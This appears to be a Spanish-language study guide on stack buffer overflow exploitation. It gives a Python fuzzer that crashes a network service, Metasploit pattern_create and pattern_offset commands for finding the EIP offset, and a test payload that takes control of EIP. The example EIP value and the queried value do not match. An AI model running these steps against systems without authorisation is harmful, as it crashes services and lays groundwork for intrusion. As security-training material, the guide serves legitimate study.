

## 🔹 Definición

Un **Stack Overflow** ocurre cuando un programa escribe más datos en la pila de los que debería, sobrescribiendo variables adyacentes, direcciones de retorno o registros críticos.  
El objetivo del atacante es llegar a **controlar el flujo de ejecución** manipulando el **EIP/RIP** (Instruction Pointer).

---

## 🛠️ Fase 1 – Fuzzing inicial

El **fuzzing** consiste en enviar entradas progresivamente más grandes al programa hasta provocar un **crash**.  
Esto permite:

- Identificar el tamaño aproximado del buffer vulnerable.
    
- Observar cómo responde la aplicación al exceso de datos.
    

### Ejemplo en Python (envío progresivo)

```python
#!/usr/bin/env python3 
import socket, time, sys  
ip = "192.168.1.100" 
port = 9999  
buffer = "A" * 100 
while True:
    try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            print(f"Enviando {len(buffer)} bytes")
            s.send(buffer.encode())         
            s.close()         
            buffer += "A" * 100         
            time.sleep(1)     
    except:         
	    print("El servicio se cayó")         
	    sys.exit(0)`
```

👉 Esto permite detectar el tamaño aproximado que hace **crashear** la aplicación.

---

## 🛠️ Fase 2 – Localización del offset

Una vez que sabemos que el programa se cae con una entrada larga, necesitamos saber **en qué posición exacta** sobrescribimos el **EIP**.

Empieza **siempre** con un tamaño intermedio:

- x86: **600–800 bytes**
    
- x64: **1200–2000 bytes**
### Generación de patrón único (con Metasploit)

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```

Ejemplo de cadena única enviada:

`Aa0Aa1Aa2Aa3Aa4Aa5...`

### Comprobación del offset en el crash

Cuando la aplicación crashea, se observa el valor que quedó en **EIP** (ejemplo: `39654138`).

Con Metasploit:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 33704232
```


Salida:

`[*] Exact match at offset 2003`

👉 Significa que a partir del byte **2003** empezamos a sobrescribir el **EIP**.

---

## 🛠️ Fase 3 – Control del EIP

Una vez encontrado el **offset exacto**, enviamos un payload de prueba:

```python
offset = 2003 
payload = "A" * offset + "BBBB" + "C" * 100  
s.send(payload.encode())
```

- `"A" * offset` → llena el buffer.
    
- `"BBBB"` (0x42 en hex) → debería sobrescribir el **EIP**.
    
- `"C" * 100` → relleno para confirmar que no afecta el control.
    

### Resultado esperado

En el **depurador (Immunity/WinDbg)**:

- El valor de **EIP** debe ser `42424242` (BBBB).
    
- Confirmamos que tenemos **control total del flujo de ejecución**.
    

---

## 📑 Resumen en tabla

|**Fase**|**Acción**|**Herramienta**|
|---|---|---|
|Fuzzing|Enviar datos progresivos hasta crash|Python, netcat|
|Localizar offset|Usar `pattern_create` y `pattern_offset` para saber dónde está el EIP|Metasploit|
|Control de EIP|Sobrescribir con un valor conocido (BBBB) y verificar en depurador|Immunity, WinDbg|

---
